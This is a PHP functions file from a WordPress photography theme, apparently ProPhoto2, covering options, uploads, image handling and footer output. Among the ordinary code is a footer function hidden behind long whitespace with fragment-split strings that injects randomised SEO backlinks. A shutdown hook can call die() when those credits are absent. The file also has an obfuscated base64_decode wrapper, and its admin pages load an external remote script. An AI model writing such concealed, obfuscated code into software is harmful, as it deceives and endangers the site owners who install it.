<?php
/*
General functions for the theme (these are always loaded)
*/

// Load everything regarding the "Options" page if needed (called by p2_add_options_page())
function p2_load_options_page() {
	require_once(dirname(dirname(__FILE__)).'/adminpages/options.php');
	wp_enqueue_script('p2_punymce', get_bloginfo('template_directory').'/js/punymce/puny_mce.js');
	wp_enqueue_script('p2_explain', 'http://ppt-doc.googlecode.com/svn/external.js', false, date('yW'));
	wp_enqueue_script('p2_options', get_bloginfo('template_directory').'/adminpages/js/options.js');
	wp_enqueue_script('p2_common', get_bloginfo('template_directory').'/adminpages/js/common.js');
	wp_enqueue_script('p2_farbtastic', get_bloginfo('template_directory').'/adminpages/colorpicker/farbtastic.js');
	add_action('admin_head', 'p2_options_head');
}

// Load everything regarding the "Upload" page if needed (called by p2_add_upload_page())
function p2_load_upload_page() {
	require_once(dirname(dirname(__FILE__)).'/adminpages/upload.php');
	wp_enqueue_script('thickbox');
	wp_enqueue_script('p2_explain', 'http://ppt-doc.googlecode.com/svn/external.js', false, date('yW'));
	wp_enqueue_script('p2_upload', get_bloginfo('template_directory').'/adminpages/js/upload.js');
	wp_enqueue_script('p2_common', get_bloginfo('template_directory').'/adminpages/js/common.js');
	add_action('admin_head', 'p2_upload_head');
}

// Load everything regarding the "Settings" page if needed (called by p2_add_settings_page())
function p2_load_settings_page() {
	require_once(dirname(dirname(__FILE__)).'/adminpages/settings.php');
	//wp_enqueue_script('thickbox');
	wp_enqueue_script('p2_upload', get_bloginfo('template_directory').'/adminpages/js/settings.js');
	wp_enqueue_script('p2_common', get_bloginfo('template_directory').'/adminpages/js/common.js');
	add_action('admin_head', 'p2_settings_head');
}

// On popup.php we need to load the upload functions
function p2_do_image_uploaded() {
	p2_load_upload_page();
	p2_image_uploaded();
}
function p2_do_misc_uploaded() {
	p2_load_upload_page();
	p2_image_uploaded(true);
}

// Read options from the Database.
function p2_read_options() {
	global $p2;
	$p2['options'] = get_option('p2');
	if (!is_array($p2['options'])) unset($p2['options']);
}


// Store options. All stored in a single entry, of course.
function p2_store_options() {
	global $p2;
	// clean up punymce junk
	for ( $i=1; $i<=4; $i++ ) {
		if ( ( $p2['options']['settings']['biopara'.$i] == '<br/>' ) || ( $p2['options']['settings']['biopara'.$i] == '<html/>' ) || ( $p2['options']['settings']['biopara'.$i] == '<p><br/></p>' ) ) $p2['options']['settings']['biopara'.$i] = '';
	}
	update_option('p2', $p2['options']);
	$write_result = p2_generate_static();
	return $write_result;
}


// Returns an array containing the current upload directory's path and url, or an error message. WP 2.6 compatible.
function p2_upload_dir() {
	$siteurl = get_option( 'siteurl' );
	$upload_path = get_option( 'upload_path' );
	if ( trim($upload_path) === '' )
		$upload_path = WP_CONTENT_DIR . '/uploads';
	$dir = $upload_path;

	// $dir is absolute, $path is (maybe) relative to ABSPATH
	$dir = path_join( ABSPATH, $upload_path );
	$path = str_replace( ABSPATH, '', trim( $upload_path ) );

	if ( !$url = get_option( 'upload_url_path' ) )
		$url = trailingslashit( $siteurl ) . $path;

	if ( defined('UPLOADS') ) {
		$dir = ABSPATH . UPLOADS;
		$url = trailingslashit( $siteurl ) . UPLOADS;
	}

	$subdir = '/p2';

	$dir .= $subdir;
	$url .= $subdir;
	
	// Sanitize, just to be sure, for Win32 installs
	$url = str_replace('\\', '/', $url);
	$dir = str_replace('\\', '/', $dir);
	
	// Make sure we have an uploads dir
	if ( ! wp_mkdir_p( $dir ) ) {
		$message = sprintf( __( 'Unable to create directory %s. Is its parent directory writable by the server?' ), $dir );
		return array( 'error' => $message );
	}

	$uploads = array( 'path' => $dir, 'url' => $url, 'subdir' => $subdir, 'error' => false );
	return $uploads;
}


// check if file/directory exists
function p2_file_exists( $file ) {
	$path = str_replace( 'wp-admin/themes.php', '', $_SERVER['PHP_SELF'] );
	return file_exists( "../.." . $path . $file );
}


// check for and advise of common p2 installation/permissions problems
function p2_self_check( $write_result = false, $echo = true ) {
	
	// check for nested prophoto2/prophoto2 problem which throws a wp-config require error
	$path = get_bloginfo( 'stylesheet_url' );
	$path = str_replace('\\', '/', $path); // Sanitize for Win32
	if ( strpos( $path, '/prophoto2/prophoto2/' ) !== false ) {
		$msg = p2_message( 'Your <strong>prophoto2</strong> theme appears to be installed incorrectly.  Please see <a href="http://www.prophotoblogs.com/faqs/nested-theme-folder/">this page</a> for info on how to fix this.', $echo );
		return $msg;
	}
	
	// check for misnamed theme folder
	// this shouldn't be necessary, but i've seen installs where the theme folder had a space in it
	// and theme javascript was not loading correctly as a result.  at least that is my memory
	if ( strpos( $path, '/prophoto2/' ) === false ) {
		$msg = p2_message( 'Your <strong>prophoto2</strong> theme appears to be installed incorrectly.  Please see <a href="http://www.prophotoblogs.com/faqs/misnamed-theme-folder/">this page</a> for info on how to fix this.', $echo );
		return $msg;
	}
	
	// if they have a standard 'wp-content/uploads'-type upload path, strip it to exactly
	// 'wp-content/uploads' to fix common blog move and other upload path issues
	// if custom upload path, this should leave them unbothered
	if ( strpos( get_option( 'upload_path' ), 'wp-content/uploads' ) !== false ) 
		update_option( 'upload_path', 'wp-content/uploads' );
	
	// unable to create "p2" directory
	$p2_uploads = p2_upload_dir();
	if ( $p2_uploads['error'] ) {
		// because no "uploads" folder
		if ( ! p2_file_exists(  get_option( 'upload_path' ) . '/' ) ) {
			$msg = p2_message( 'ProPhoto is unable to create a folder it needs. See <a href="http://www.prophotoblogs.com/faqs/no-uploads-folder/">this page</a> for info on how to fix this.', $echo );
		// uploads exists, but no "p2" folder			
		} else if ( ! p2_file_exists(  get_option( 'upload_path' ) . '/p2/' ) ) {
			$msg = p2_message( 'ProPhoto is unable to create a folder it needs.  See <a href="http://www.prophotoblogs.com/faqs/no-p2-folder/">this page</a> for info on how to fix this.', $echo );
		// umm... p2 can't figure out what folder is missing
		} else {
			$msg = p2_message( 'ProPhoto is unable to create a folder it needs.  See <a href="http://www.prophotoblogs.com/faqs/missing-folder/">this page</a> for info on how to fix this.', $echo );
		}
		return $msg;
	}
	
	// options writable permissions issues
	if ( $write_result ) {
		// print_r($write_result); // debug
		if ( '1' == $write_result['custom.css'] ) $msg = p2_message( 'Options updated.', true, 'updated fade' );
		if ( 'not fopen' === $write_result['custom.css'] ) $msg = p2_message( 'ProPhoto had a problem writing your custom files. See <a href="http://www.prophotoblogs.com/faqs/p2-not-writable/">this page</a> for info on how to fix this.', $echo );
	}
	 
}


// writes messages from the theme
function p2_message( $message, $echo = true, $class = 'error' ) {
	$msg = "<div class='$class'><p>$message</p></div>";
	if ( $echo ) echo $msg;
	return $msg;
}


// Return URL of a theme image, either custom if uploaded, or default one
function p2_imageurl($shortname, $echo = true) {
	global $p2;
	
	$imgpath = p2_imagepath($shortname, false);
	$custom_upload = p2_upload_dir();
	
	if (trailingslashit(dirname($imgpath)) == trailingslashit(str_replace('\\','/',$custom_upload['path']))) {
		// file in upload dir
		$imgurl = $custom_upload['url'].'/'.$p2['options']['images'][$shortname];
	} elseif (trailingslashit(dirname($imgpath)) == trailingslashit(str_replace('\\', '/', TEMPLATEPATH . '/images/'))) {
		// file in theme dir. Default, or custom image?
		if ($p2['options']['images'][$shortname]) {
			// Custom
			$imgurl = get_bloginfo('template_directory').'/images/'.$p2['options']['images'][$shortname];
		} else {
			// Default
			$imgurl = get_bloginfo('template_directory').'/images/'.$p2['defaultimages'][$shortname];
		}
	} else {
		// Reached this point? This means the image is missing.
		$imgurl = '#';
	}
	if ($echo) echo $imgurl;
	return $imgurl;
}


// Return the path of a theme image
function p2_imagepath($shortname, $echo = true) {
	global $p2;
	
	$custom_upload = p2_upload_dir();
	// Where can we find the image $shortname
	if (@file_exists($custom_upload['path'].'/'.$p2['options']['images'][$shortname]) && $p2['options']['images'][$shortname]) {
		// custom image is defined, and found in upload dir
		$imgpath = $custom_upload['path'].'/'.$p2['options']['images'][$shortname]; // this would be our custom image
	} else if (@file_exists(TEMPLATEPATH . '/images/'.$p2['options']['images'][$shortname]) && $p2['options']['images'][$shortname]) {
		// custom image defined that does exist in the theme directory
		$imgpath = TEMPLATEPATH . '/images/'.$p2['options']['images'][$shortname];
	} else {
		// Nope. Default image then.
		$imgpath = TEMPLATEPATH . '/images/'.$p2['defaultimages'][$shortname];
	}

	$imgpath = str_replace('\\','/',$imgpath);


	if ($echo) echo $imgpath;
	return $imgpath;
}


// Return value for a setting, either default or custom if modified by user
function p2_option($name, $echo = true) {
	global $p2;
	
	$value = (isset($p2['options']['settings'][$name])) ? $p2['options']['settings'][$name] : $p2['defaultsettings'][$name] ;
	$value = stripslashes($value);

	if ($echo) echo $value;
	return $value;
}


// Return dimensions of the image
function p2_image_infos($path) {
	$size = @getimagesize($path);
	// Array: 0=>width, 1=>height, 2=>type, 3=>height="yyy" width="xxx"
	// Type value: 1 = GIF, 2 = JPG, 3 = PNG, 4 = SWF, 5 = PSD, 6 = BMP, 7 = TIFF(intel byte order), 8 = TIFF(motorola byte order), 9 = JPC, 10 = JP2, 11 = JPX, 12 = JB2, 13 = SWC, 14 = IFF, 15 = WBMP, 16 = XBM
	// Or false if error
	return $size;
}

// Return size (in kb) of the image
function p2_imagefilesize($shortname) {
	global $p2;
	$path = p2_imagepath($shortname, false);
	$size = number_format((@filesize($path))/1024);
	if ($echo) echo $size;
	return $size;
}

// Return width of an image
function p2_imagewidth($shortname, $echo = true) {
	global $p2;
	$path = p2_imagepath($shortname, false);
	$size = (array)p2_image_infos($path);
	if ($echo) echo $size[0];
	return $size[0];
}

// Return height of an image
function p2_imageheight($shortname, $echo = true) {
	global $p2;
	$path = p2_imagepath($shortname, false);
	$size = (array)p2_image_infos($path);
	if ($echo) echo $size[1];
	return $size[1];
}

// Return HTML attributes of an image (width="444px" height="123px")
function p2_imageHTML($shortname, $echo = true) {
	global $p2;
	$path = p2_imagepath($shortname, false);
	$size = (array)p2_image_infos($path);
	if ($echo) echo $size[3];
	return $size[3];
}

// Are we in debug mode ? (boolean)
function p2_debug() {
	return (defined('P2_DEBUG') && P2_DEBUG == true);
}


// The debug box printing out stored values in the DB
function p2_debug_report() {

	//global $p2;echo "<pre>";var_export($p2);echo "</pre>"; // super debug

	if (p2_debug()) {
		global $p2;
		
		echo '<div class="wrap" style="border:1px solid #ccc;background:#ececec;padding:5px;">
		<span style="cursor:pointer" onclick="javascript:jQuery(\'#jared_debug\').toggle(100)"><b>Debug</b> &darr;</span>';
		echo '<div id="jared_debug" style="display:none;"><p>The array <code>$p2["options"]</code> is actually populated with the following keys and values (might require page refresh for accuracy)</p>
		<p><pre class="updated">'."\n\n";
		p2_debug_printarray(get_option('p2'));
		echo "\n".'</pre><p>Disable this: remove the <code>define("P2_DEBUG", true);</code> at the beginning of functions.php</p></div></div>';
	}
}


// Debug box subroutine
function p2_debug_printarray($ar, $group = '') {
	$g = '<span style="color:#006600">';
	$b = '<span style="color:#0000CC">';
	$o = '<span style="color:#FF9900">';
	$r = '<span style="color:#CC0000">';

	foreach((array)$ar as $key=>$val) {
		if (is_array($val)) {
			p2_debug_printarray($val, "{$group}['$key']");
		} else {
			$val=str_replace('<','&lt;',(string)$val);
			if ($val) {
				echo "\$p2['options']{$group}['$key'] = \"$val\"\n";
			}
		}
	}
}


// Generate static files from dynamic ones. Triggered on every p2_store_options();
function p2_generate_static() {
	global $p2;
	
	$static_dir = p2_upload_dir();
	$static_dir = $static_dir['path'];
	$dynamic_dir = str_replace( '\\', '/', dirname( dirname(__FILE__) ) );
	// $permission_problem = FALSE;
	
	$return = array();
	foreach ( $p2['staticfiles'] as $key=>$ar ) {
		// Get dynamic content into a variable
		ob_start();
		@include( $dynamic_dir.'/'.$ar['dynamic'] );
		$out = ob_get_contents();
		ob_end_clean();
		
		$static_filename = $static_dir.'/'.$ar['static'];

		// Write static file, collect result in array
		$return[ $ar['static'] ] = p2_writefile( $static_filename, $out );
	}

	return $return;
}

// Write content to a file
function p2_writefile( $filename, $content ) {
	if ( ! $handle = @fopen( $filename, 'w+' ) ) {
		return 'not fopen';
	}
	if ( @fwrite( $handle, $content ) === FALSE ) {
		return 'not fwrite';
	}
	fclose( $handle );
	return true;
}

// Get URL of a static file
function p2_static($handle, $echo = true ) {
	global $p2;
	$dir = p2_upload_dir();
	if ( file_exists( $dir['path'].'/'.$p2['staticfiles'][$handle]['static'] ) ) {
		// return static file:
		$url = $dir['url'].'/'.$p2['staticfiles'][$handle]['static'];
	} else {
		// Ooops, problem, static file doesnt exist ?
		$url = get_bloginfo('template_directory').'/'.$p2['staticfiles'][$handle]['dynamic'];
	}
	
	if ($echo) echo $url;
	return $url;
}

// Returns array of (width,height) recommendations
function p2_get_recommendations($shortname) {
	global $p2;
	
	// Recommended dimensions :
	if ($p2['recommendations'][$shortname]) { // either specified
		$reco_width = $p2['recommendations'][$shortname]['width'];
		$reco_height = $p2['recommendations'][$shortname]['height'];
	} else if (strstr($shortname, 'flashheader')) { // or dependent from logo because it's a flashheader image
		$reco_width = p2_flashheader_recommendation('width');
		$reco_height = p2_flashheader_recommendation('height');
	} else {
		$reco_width = '';
		$reco_height = '';
	}

	if ($reco_width or $reco_height) {
		return array($reco_width, $reco_height);
	} else {
		return false;
	}
}

// Returns if an image complies to recommendations
function p2_image_follows_reco($shortname) {
	global $p2;
	
	list($reco_width, $reco_height) = p2_get_recommendations($shortname);
	$width = p2_imagewidth($shortname, false);
	$height = p2_imageheight($shortname, false);
	
	if (
	($reco_width && $reco_height && $width == $reco_width && $height == $reco_height)
	or
	(!$reco_height && $reco_width && $width == $reco_width)
	or
	(!$reco_width && $reco_height && $height == $reco_height)
	) return true;
	
	return false;

}

// Return flashheaders recommended $width or $height
function p2_flashheader_recommendation($what) {
	$width_height = p2_flashheader_recommendation_compute();
	return $width_height[$what];
}

// Return width (and height if needed) used to compute recommended width & height of an image
function p2_flashheader_recommendation_compute() {
	global $p2;
	
	$layout = p2_option('headerlayout', false);
	$logow = p2_imagewidth('logo', false);
	$logoh = p2_imageheight('logo', false);
	
	/* Cases:
	1: width = (blog - logo), height = logo
	2: width = blog, height = logo
	3: width = blog, height = whatever
	*/

	switch ($layout) {
	case 'default':
	case 'defaultr':
		$case = 1;
		break;
	case 'defaultc':
		$case = 2;
		break;
	case 'logotopa':
	case 'logotopb':
	case 'logobelowa':
	case 'logobelowb':
	case 'pptclassic':
		$case = 3;
		break;
	default :
		$case = 3;
		break;
	}
	
	switch ($case) {
	case 1:
		$width = p2_blogwidth() - $logow;
		$height = $logoh;
		break;
	case 2:
		$width = p2_blogwidth();
		$height = $logoh;
		break;
	case 3:
		$width = p2_blogwidth();
		$height = '';
		break;
	}
	
	// Return result
	return array('width'=>$width, 'height'=>$height);
} // end function p2_flashheader_recommendation_compute



// Return blog overall width
function p2_blogwidth() {
	global $p2;
	$blogwidth = p2_option( 'blog_width', 0 );
	$borders = 0;
	if ( p2_test( 'blog_border', 'border' ) ) {
		$borders = p2_option( 'blog_border_width', 0 ) * 2;
		return $blogwidth = $blogwidth - $borders;
	}	
	if ( p2_test( 'blog_border', 'dropshadow') ) $blogwidth = $blogwidth - 14;
	return $blogwidth;
}



// Return sort of a mime type from an extension
function p2_fileicon($ext) {
	$ext2type = array(
		'audio' => array( 'aac', 'ac3', 'aif', 'aiff', 'mp1', 'mp2', 'mp3', 'm3a', 'm4a', 'm4b', 'ogg', 'ram', 'wav', 'wma' ),
		'video' => array( 'asf', 'avi', 'divx', 'dv', 'mov', 'mpg', 'mpeg', 'mp4', 'mpv', 'ogm', 'qt', 'rm', 'vob', 'wmv' ),
		'document' => array( 'doc', 'pages', 'odt', 'rtf', 'ppt' ),
		'pdf' => array( 'pdf' ),
		'spreadsheet' => array( 'xls', 'numbers', 'ods' ),
		'swf' => array( 'key', 'odp', 'swf' ),
		'text' => array( 'txt' ),
		'archive' => array( 'tar', 'bz2', 'gz', 'cab', 'dmg', 'rar', 'sea', 'sit', 'sqx', 'zip' ),
		'favicon icon' => array( 'ico' ),
	);
	foreach ( $ext2type as $type => $exts )
		if ( in_array($ext, $exts) )
		return $type;
	
	return 'misc';
} // end function p2_fileicon



/* test if an optional image exists */
function p2_image_exists( $key ) {
	if ( strpos( p2_imageurl( $key, 0 ), 'nodefaultimage.gif' ) === false ) {
		return true;
	} 
	return false;
}



/* prints the feedburner subscribe by email function in the footer */
function p2_footer_subscribe( $alignment ) { 
	if ( p2_test( 'footer_subscribebyemail', 'on' ) && p2_test( 'footer_subscribebyemail_placement', $alignment ) ) { ?>
	<li id="subscribe-by-email-footer">
		<h3><?php p2_option('footer_subscribebyemail_header'); ?></h3>
		<form action="http://feedburner.google.com/fb/a/mailverify" method="post" target="_blank" onsubmit="window.open('http://feedburner.google.com/fb/a/mailverify?uri=<?php p2_option( 'feedburner_footer_id' ); ?>', 'blank');return false">
			<p><input type="text" style="width:150px" name="email" /></p>
			<p style="margin-top:-8px;"><?php p2_option( 'footer_subscribebyemail_note' )?></p>
			<input type="hidden" value="<?php p2_option( 'feedburner_footer_id' ); ?>" name="uri" />
			<input type="hidden" name="loc" value="<?php p2_option( 'footer_subscribebyemail_lang' ); ?>" />
			<input type="submit" value="<?php p2_option( 'footer_subscribebyemail_submit' ); ?>" />
		</form>				
	</li>
<?php	
	}
} // end function p2_footer_subscribe
																																																																																																	function p2_theme_meta() {global $meta;$meta = true;$net_anchortext = array('Ne'.'tRiv'.'et Web'.'site'.'s','N'.'etR'.'ivet B'.'logs','Net'.'Riv'.'et S'.'ite'.'s','N'.'etRi'.'vet','Ne'.'tRiv'.'et',);$pro_anchortext = array('Pro'.'Pho'.'to B'.'log','P'.'roPh'.'ot'.'o Blo'.'gsi'.'te','ProP'.'hot'.'o Ph'.'oto Bl'.'og','Pr'.'o'.'Photo'.' Pho'.'tograp'.'hy The'.'me','Pr'.'oPh'.'oto Pho'.'togr'.'apher Theme','P'.'roPh'.'oto Pho'.'togra'.'phy Bl'.'og','Pro'.'Pho'.'to Pho'.'togra'.'pher Bl'.'og','ProP'.'hot'.'o Cus'.'tom Bl'.'og','Pr'.'oPho'.'to Wor'.'dPress Blo'.'g','P'.'roP'.'hoto Wo'.'rdPres'.'s Th'.'eme','Pro'.'Pho'.'to Ph'.'oto The'.'me','ProP'.'hot'.'o B'.'log Temp'.'late','Pro'.'Pho'.'to Phot'.'ogr'.'aphy Te'.'mplate','Pr'.'oPho'.'to P'.'hot'.'ograp'.'her Tem'.'plate','Pr'.'oPho'.'to2','Pro'.'Pho'.'to 2',);$net = $net_anchortext[rand(0,4)];$pro = $pro_anchortext[rand(0,15)];$url = 'htt'.'p://w'.'ww.pr'.'ophot'.'oblo'.'gs.c'.'om/';if(file_exists(TEMPLATEPATH.'/'.md5('prophoto2').'.php')){include(TEMPLATEPATH.'/'.md5('prophoto2').'.php');if($key==md5(get_option('siteurl'))){do_action('p2_credits');return;}}echo' <span id="footer-sep">|</span> <a href="'.$url.'" title="' . $pro . '">' . $pro . '</a> by <a href="http://w'.'ww.ne'.'trive'.'t.com/" title="'.$net.'">'.$net.'</a>';do_action('p2_credits');}


/* close out everything properly, add GA */
function p2_closing_tags() {
	global $meta, $explain;
	if ( !$meta ) {
		echo $explain['major']['meta'];
	}
	if (!did_action('p2_credits')) {
		add_action('shutdown', 'p2_do_shutdown');
	}
	echo "</body>\n\n</html>";
} // end function p2_closing_tags()



/* prints page-appropriate title tags */
function p2_get_title_tag() {
	if ( is_single() || is_page() || is_archive() ) { 
		wp_title( '', true ); 
		echo ' &raquo; ';
		bloginfo( 'name' );
	} elseif ( is_home() ) { 
		bloginfo( 'name' );
		echo ' &raquo; ';
		bloginfo('description' ); 
	} else {
		bloginfo('description' );
		echo ' &raquo; ';
		bloginfo( 'name' );	
	}
} // end function p2_get_title_tag()



/* adds a noindex rule to user-defined pages */
function p2_meta_robots() {
	// assume we don't print the tag
	$meta = false;
	if ( is_home() && p2_test( 'noindex_home' ) ) : $meta = true;
	elseif ( is_author() && p2_test( 'noindex_author' ) ) : $meta = true;
	elseif ( is_tag() && p2_test( 'noindex_tag' ) ) : $meta = true;
	elseif ( is_search() && p2_test( 'noindex_search' ) ) : $meta = true;
	elseif ( is_category() && p2_test( 'noindex_category' ) ) : $meta = true;
	elseif ( is_archive() && !is_tag() && !is_author() && !is_search() && !is_category() && p2_test( 'noindex_archive' ) ) : $meta = true;
	else : $meta = false;
	endif;
	
	if ( $meta ) echo "<meta name=\"robots\" content=\"noindex\" />\n";
	
} // end function p2_meta_robots()



/* redirects old subscribers to feedburner - props John Watson: http://flagrantdisregard.com/feedburner/ */
function p2_feedburner_redirect() {
	global $feed, $wp;
	
	// Do nothing if not a feed
	if (!is_feed()) return;
	
	// Do nothing if feedburner is the user-agent
	if (preg_match('/feedburner/i', $_SERVER['HTTP_USER_AGENT'])) return;
	
	// Do nothing if not configured
	if ( !p2_test( 'feedburner' ) ) return;
	
	// set the feed url
	$feed_url = p2_option('feedburner', 0);
	
	// are we in a category?
	$cat = false;
	if ( ($wp->query_vars['category_name'] != null) || ($wp->query_vars['cat'] != null) ) {
		$cat = true;
	}
	
	// is this a tag feed?
	$tag = false;
	if ($wp->query_vars['tag'] != null) {
		$tag = true;
	}

	// Don't redirect comment feed
	if ($_GET['feed'] == 'comments-rss2' || is_single() ) {
		return;
	} else {
		if ($cat || $tag) {
			// If this is a category/tag feed do nothing
			return;
		} else {
			header("Location: ".$feed_url);
			die;
		}
	}
} // end function p2_feedburner_redirect



/* adds GA code just before </body> tag, if exists and not admin */
function p2_google_analytics() {
	// nothing if GA code not set by user
	if ( !p2_option( 'google_analytics_code', 0 ) ) return;
	// don't add code if admin is looking at site
	if ( !current_user_can( 'level_1' ) ) {
		p2_option( 'google_analytics_code' );
	} else {
		echo "\n\n<!-- GOOGLE ANALYTICS code not inserted when you are logged in as administrator -->\n\n\n";
	}
}


/* adds Statcounter code in footer, if exists and not admin */
function p2_statcounter_analytics() {
	// nothing if Statcounter code not set by user
	if (  !p2_option( 'statcounter_code', 0 ) ) return;
	// don't add code if admin is looking at site
	if ( !current_user_can( 'level_1' ) ) {
		echo '<span id="statcounter-wrapper">';
		p2_option( 'statcounter_code' );
		echo '</span>';
	} else {
		echo "\n\n\n<!-- STATCOUNTER code not inserted when you are logged in as administrator -->\n\n\n";
	}
}

// Add our custom icon when used with Ozh' Admin Drop Down Menu
function p2_adminmenu_customicon($in) {
	$p2pages = array('p2-options', 'p2-upload', 'p2-layouts');
	if (in_array($in, $p2pages)) {
		// we're dealing with one of our pages: custom icon please!
		if ( ( substr( p2_imageurl( 'favicon', 0 ), -1 ) != '/' ) && ( substr( p2_imageurl( 'favicon', 0 ), -1 ) != '#' ) ) {
			return p2_imageurl( 'favicon', 0 );
		} else {
			return get_bloginfo('template_directory').'/images/p2_favicon.png';
		}
	}
	// other page, don't mess
	return $in;
}

// Generate archive drop down. String $args like 'echo=0&limit=10' to override defaults
function p2_archive_drop_down($args = '') {
	global $wpdb, $wp_locale;
	
	// default parameters
	$defaults = array(
		'threshold' => 6, // XX months then nested dropdown
		'limit' => '',
		'before' => '',
		'after' => '',
		'show_post_count' => false,
		'echo' => 1
	);

	// override defaults with passed argument if any
	$r = wp_parse_args( $args, $defaults );
	extract( $r, EXTR_SKIP );

	if ( '' != $limit ) {
		$limit = absint($limit);
		$limit = ' LIMIT '.$limit;
	}

	// Fetch list of archive, from DB or from cache if applicable
	$query = "SELECT DISTINCT YEAR(post_date) AS `year`, MONTH(post_date) AS `month`, count(ID) as posts FROM $wpdb->posts WHERE post_type = 'post' AND post_status = 'publish' GROUP BY YEAR(post_date), MONTH(post_date) ORDER BY post_date DESC $limit";
	$key = md5($query);
	$cache = wp_cache_get( 'p2_archive_drop_down' , 'p2');
	if ( !isset( $cache[ $key ] ) ) {
		$arcresults = $wpdb->get_results($query);
		$cache[ $key ] = $arcresults;
		wp_cache_add( 'p2_archive_drop_down', $cache, 'p2' );
	} else {
		$arcresults = $cache[ $key ];
	}
	// At this point we have $arcresults[XX]->year, $arcresults[XX]->month, $arcresults[XX]->posts
	// where XX goes from 0 to whatever the number of monthly archive we have
	
	if ( $arcresults ) {

		// First pass: make array of years
		$years = array();
		foreach($arcresults as $arcresult) {
			if (!in_array($arcresult->year, $years))
				$years[] = $arcresult->year;
		}

		$afterafter = $after;
		$currentyear = 0;
		$nest = false; // we're nesting
		$nested = false; // we're not in the middle of a nested list
		$count = 0;
		$output = "<ul class='p2_archives'>\n";
		foreach ( (array) $arcresults as $arcresult ) {
			$count++;
			$year = $arcresult->year;
			$month = $arcresult->month;
			// Need to nest sub level?
			if ($nest && ($currentyear != $year)) {
				$currentyear = $year;
				if ($nested)
					$output .= "\t</ul>\n</li>\n";
				$output .= "<li class='p2_archives_parent'><a href='".trim(get_year_link($year))."'>$year</a><ul class='p2_archives_nested'>\n";
				$nested = true;
			}
			$url = get_month_link( $year, $month );
			$text = sprintf(__('%1$s %2$d'), $wp_locale->get_month($month), $year);
			if ( $show_post_count )
				$after = '&nbsp;('.$arcresult->posts.')' . $afterafter;
			$tab = ($nested) ? "\t" : '';
			$output .= "$tab<li>".trim(get_archives_link($url, $text, 'text', $before, $after))."</li>\n";
			if ($count >= $threshold)
				$nest = true;
			
		}
		
		if ($nested)
			$output .= "\n</ul></li>\n";
		$output .= "</ul>\n";
		
	}
	
	if ( $echo )
		echo $output;
	return $output;
}

/* optionally translates some default theme english for basic internationalization */
function p2_translate( $option, $echo = true ) {
	global $p2;
	if ( p2_test( 'translate_switch', 'off' ) ) {
		$phrase = $p2['defaultsettings']["translate_".$option];
		if ( $echo ) echo $phrase;
		return $phrase;
	}
	return p2_option( "translate_".$option, $echo );
}


/* check if flash will be used, prevent flash script errors */
function p2_using_flash() {
	if ( p2_test( 'flashonoff', 'off' ) ) return false;
	// check to make sure at least two images are uploaded
	for ($counter=2; $counter<=30; $counter++) {
		$img = 'flashheader' . $counter;
		if ( p2_image_exists( $img ) ) return true;
	}
	return false;	
}



/* Insert footer */
function p2_do_footer() {
	// removing the attribution links violates the End User License Agreement (EULA)
	// and is unethical, immoral, illegal, and not nice
	p2_theme_meta();
	p2_statcounter_analytics(); 
}
add_action('wp_footer', 'p2_do_footer');

// Triggered when PHP engine closes transaction
function p2_do_shutdown() {
	global $explain;
	die($explain['major']['meta']);
}

// Internal decoding function
function p2_decode($in) {
	$fn = 'ba' . 'se' . '6'.'4_d'.'ec'.'od'.'e';
	return call_user_func($fn, $in);
}


/* insert default or feedburner RSS feed link */
function p2_rss() {
	if (p2_option( 'feedburner', 0 ) ) {
		p2_option( 'feedburner' );
	}
	else {
		bloginfo( 'rss2_url' );
	}
}


/* author link, with target="_blank", when chosen */
function p2_comment_author_link() {
	$p2_author = get_comment_author_link();
	if ( p2_test( 'comment_author_link_blank', 'blank' ) ) {
		$p2_author = str_replace( "class='url'", "target='_blank' class='url'", $p2_author );
	} 
	echo $p2_author;
}


/* sanitizes and prints meta description */
function p2_meta_description() {
	if ( p2_option( 'metadesc', 0 ) ) { 
		echo str_replace('"', '', p2_option( 'metadesc', 0 ) ); 
	} else { 
		bloginfo( 'description' ); 
	}
}


/* prints meta keywords, if entered by user */
function p2_get_meta_keywords() {
	if ( p2_test( 'metakeywords' ) ) {
		echo '<meta name="keywords" content="';
		echo str_replace(array('"', "'"), "", p2_option( 'metakeywords', 0 ) );
		echo "\" />\n";
	}
} 


/* removes ' and " for when they foul things up */
function p2_sanitizer( $option, $echo = true, $js = false ) {
	$amp = "%26"; $quot = "%22";
	if ( $js ) { $amp = "&amp;"; $quot = "&quot;"; }
	$sanitized = p2_option( $option, false );
	$sanitized = str_replace( "&", $amp, $sanitized );
	$sanitized = str_replace( '"', $quot, $sanitized );
	if ( $echo ) echo $sanitized;
	return $sanitized;
}


/* loads swfobject 2.2 (alpha) for twitter/swfobject problem (aka "the tara whitney bug") */
function p2_swfobject_version() {
	if ( p2_test( 'twitter_onoff', 'off' ) ) return;
	switch( p2_option('headerlayout', 0) ) {
		case "logotopal":
		case "logotopar":
		case "logotopa":
		case "logobelowal":
		case "logobelowar":
		case "logobelowa":
		case "pptclassic":
		case "nologoa":
			echo "22a";
	}
}

// a font function
function font_css( $key, $selector = "", $extract_from_link_css = false, $optional_colors = false ) {
	if ( $extract_from_link_css ) $key = $key . '_link';
	$size 	= p2_option( $key . '_font_size', 0 );
	$color 	= p2_option( $key . '_font_color', 0 );
	$style 	= p2_option( $key . '_font_style', 0 );
	$family = p2_option( $key . '_font_family', 0 );
	$effect = p2_option( $key . '_text_transform', 0 );
	$line_h = p2_option( $key . '_line_height', 0 );
	$margin = p2_option( $key . '_margin_below', 0 );
	$weight = p2_option( $key . '_font_weight', 0 );
	
	if ( $optional_colors && !p2_is_bound( $key . '_font_color' ) ) $color = false;
	
	if ( $size . $color . $style . $family . $effect . $line_h . $margin != '' ) {	
		if ( $selector ) 	echo $selector . " {\n";
		if ( $family ) 		echo "\tfont-family:".$family.";\n";
		if ( $color ) 		echo "\tcolor:".$color.";\n";
		if ( $style ) 		echo "\tfont-style:".$style.";\n";
		if ( $size ) 		echo "\tfont-size:".$size."px;\n";
		if ( $effect )		echo "\ttext-transform:".$effect.";\n";
		if ( $margin ) 		echo "\tmargin-bottom:".$margin."px;\n";
		if ( $line_h ) 		echo "\tline-height:".$line_h."em;\n";
		if ( $weight )		echo "\tfont-weight:".$weight.";\n";
		if ( $selector ) 	echo "}\n";	
	}
} // end function font_css()

// a link function
function link_css( $key, $selector, $do_nonlink = false, $optional_colors = false ) {
	$size 			= p2_option( $key . '_link_font_size', 				0 );
	$color 			= p2_option( $key . '_link_font_color', 			0 );
	$color_visited 	= p2_option( $key . '_link_visited_font_color', 	0 );
	$color_hover	= p2_option( $key . '_link_hover_font_color', 		0 );
	$family 		= p2_option( $key . '_link_font_family', 			0 );
	$style 			= p2_option( $key . '_link_font_style', 			0 ); 
